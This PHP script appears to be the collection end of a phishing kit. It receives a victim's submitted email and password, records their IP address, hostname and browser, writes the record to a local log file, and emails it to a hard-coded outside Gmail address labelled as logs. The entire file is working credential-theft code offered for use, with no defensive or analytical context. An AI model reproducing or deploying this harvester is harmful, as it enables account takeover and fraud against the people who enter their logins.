<?php
//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
//Getting UserID info from Session
$x1 = $_POST['x1'];
$x2 = $_POST['x2'];

$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];

$mesaj="==================+[ User Info  ]+==================
Em: $x1
Pd   : $x2
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

$fp = fopen('par.txt','a');
$savestring = $mesaj."\n";
fwrite($fp, $savestring);
fclose($fp);

	$mailHeaders = "From: " . $x1. "<". $x1 .">\r\n";
$subject = "ADAMX  LOGS";
mail('frankstan219@gmail.com', $subject,$mesaj, $mailHeaders);

?>

